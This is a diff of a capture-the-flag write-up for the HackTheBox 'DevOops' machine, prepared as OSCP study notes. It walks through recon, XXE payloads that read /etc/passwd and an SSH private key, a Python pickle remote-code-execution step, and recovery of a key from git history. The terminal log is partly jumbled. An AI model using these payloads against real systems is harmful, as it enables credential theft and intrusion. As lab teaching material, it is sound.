@@ -112,7 +112,6 @@ The decisive lines were:
 | 22/tcp | SSH | Possible key or credential validation path |
 | 5000/tcp | HTTP, initially labelled `upnp` | Non-standard web application requiring direct HTTP checks |
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/1.nmap-allports.png>)
 SCREENSHOT: Full TCP scan. Red marks the two open ports; green marks the complete port range.
 
 ## 2. Identify service versions
@@ -128,7 +127,6 @@ sudo nmap -Pn -n -sC -sV --version-light \\
 
 The useful banner details were OpenSSH 7.2p2 and Gunicorn 19.7.1. The Gunicorn banner matters because it identifies a Python web application even though the page itself has no title.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/2.nmap-services.png>)
 SCREENSHOT: Focused service scan. Red marks SSH and Gunicorn; green marks the version information used to choose Python-aware source review.
 
 ## 3. Inspect the web root and discover application paths
@@ -152,10 +150,8 @@ The important discovery output was:
 /upload  (Status: 200) [small HTML upload form]
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/3.index.png>)
 SCREENSHOT: The application root. Red marks the Blogfeeder clue; green marks the `/feed` reference.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/4.gobuster-upload-200.png>)
 SCREENSHOT: Gobuster results. Red marks `/upload`; `/feed` is the secondary application route.
 
 ## 4. Read the upload form before sending XML
@@ -168,7 +164,6 @@ curl -sS "http://$BoxIP:$WebPort/upload" | tee "$BoxDir/loot/upload.txt"
 
 The form used `multipart/form-data` with a file field named `file`. This is different from posting raw XML directly to an API endpoint, so the payload must be attached with curl's `-F` option.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/5.upload-content-page.png>)
 SCREENSHOT: `/upload` form. Red marks the `file` multipart field; green marks the XML element names.
 
 ## 5. Confirm XXE with a safe `/etc/passwd` read
@@ -181,7 +176,6 @@ Create the payload locally:
 cat > "$BoxDir/exploits/xxe-passwd.xml" <<'EOF'
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE feed [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <feed>
   <Author>&xxe;</Author>
@@ -201,7 +195,6 @@ curl -sS \\
 
 Focus on the reflected `Author` content. The result exposed interactive accounts including `git`, `roosa`, and `blogfeed`. That gave a candidate home-directory path for source and SSH-key reads.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/6.xxe-passwd.png>)
 SCREENSHOT: Reflected `/etc/passwd` contents. Red marks the discovered interactive usernames; green marks the successful entity expansion.
 
 > [!warning] 💡 Gotcha
@@ -217,7 +210,6 @@ Build a second payload using the source path and save the response:
 cat > "$BoxDir/exploits/xxe-feedpy.xml" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE feed [
-  <!ENTITY xxe SYSTEM "file://$SourcePath">
 ]>
 <feed>
   <Author>&xxe;</Author>
@@ -241,7 +233,6 @@ postObj = pickle.loads(picklestr)
 return "POST RECEIVED: " + postObj['Subject']
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/7.source-newpost.png>)
 SCREENSHOT: Source disclosure. Red marks `pickle.loads()`; green marks the base64 decoding and the reflected `Subject` field.
 
 ## 7. Prove Python pickle command execution safely
@@ -279,7 +270,6 @@ curl -sS -X POST \\
 
 The response returned an identity line for `roosa`, confirming server-side command execution. At this point a reverse-shell callback was not required. A callback request hung because target egress was not reliable, so the web response was kept as the proof channel and the SSH-key path was used for a stable shell.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/8.pickle-rce.png>)
 SCREENSHOT: Pickle execution proof. Red marks the returned identity; green marks the `/newpost` request.
 
 > [!warning] 💡 Gotcha
@@ -293,7 +283,6 @@ The user list identified `roosa` as an interactive account, and the application 
 cat > "$BoxDir/exploits/xxe-sshkey.xml" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE feed [
-  <!ENTITY xxe SYSTEM "file://$KeyPath">
 ]>
 <feed>
   <Author>&xxe;</Author>
@@ -331,7 +320,6 @@ hostname
 pwd
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/10.ssh-roosa.png>)
 SCREENSHOT: SSH foothold as `roosa`. Red marks the shell identity; green marks the host name.
 
 ## 10. Enumerate the user and inspect the repository
@@ -349,7 +337,6 @@ git -C "$HOME/work/blogfeed" log --oneline --all
 
 The history contained normal application commits plus an older commit describing an integration key. The working tree alone was not enough; `git log --all` was the decision point that led to historical source review.
 
-![](<file:///home/kali/Platforms/HackTheBox/DevOops/screenshots/11.git-log.png>)
 SCREENSHOT: Git history. Red marks the integration-key commit; green marks the repository path and commit sequence.
 
 ## 11. Recover the historical integration key
@@ -527,7 +514,6 @@ export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-me
 ```text
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE feed [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <feed>
   <Author>&xxe;</Author>
@@ -629,13 +615,9 @@ blogfeed:x:1003:1003:,,,:/home/blogfeed:/bin/false
 [sudo] password for kali:
 kali@kali:~/Platforms/HackTheBox/DevOops [22:59:25] $ =cat > $BoxDir/exploits/xxe-passwd.xml << 'EOF'
 $ [23:00:39] cat > $BoxDir/exploits/xxe-passwd.xml << 'EOF'
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
   -F "file=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \
   http://$BoxIP:$WebPort/upload | tee $BoxDir/loot/xxe-passwd.txt
-<!DOCTYPE feed [<!ENTITY xxe"file:///etc/passwd">
   http://$BoxIP:$WebPort/upload | tee $BoxDir/loot/xxe-passwd.txtcurl"file=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml"tee>
-  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">
-<!DOCTYPE feed [<!ENTITY xxe"file:///home/roosa/.ssh/id_rsa">
   Author: -----BEGIN RSA PRIVATE KEY-----
   > $BoxDir/loot/roosa_id_rsa
 chmod 600 $BoxDir/loot/roosa_id_rsa
@@ -688,12 +670,12 @@ loot flag root 9733d6504fe36733c2556e2bc03f3e72
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Linux - Service Scan]]
-- [[RUNBOOK V2/Linux - Web Enum]]
-- [[RUNBOOK V2/Linux - Shell Stabilise]]
-- [[RUNBOOK V2/Linux - Local Enum]]
-- [[RUNBOOK V2/Linux - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
+- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
+- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
+- [[OSCP/RUNBOOK V2/Linux - Clean Down]]
 
 ## Why this matters for OSCP
 
